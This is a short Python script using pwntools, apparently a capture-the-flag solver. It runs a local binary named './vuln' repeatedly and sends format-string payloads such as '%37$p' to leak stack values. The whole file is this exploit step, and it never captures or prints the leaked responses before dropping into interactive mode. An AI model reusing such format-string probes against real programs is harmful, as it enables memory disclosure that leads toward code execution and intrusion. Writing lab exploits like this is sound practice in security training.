from pwn import *


for i in range(37, 50):
    r = process("./vuln")
    r.recvline()
    r.sendline(f"%{i}$p")

r.interactive()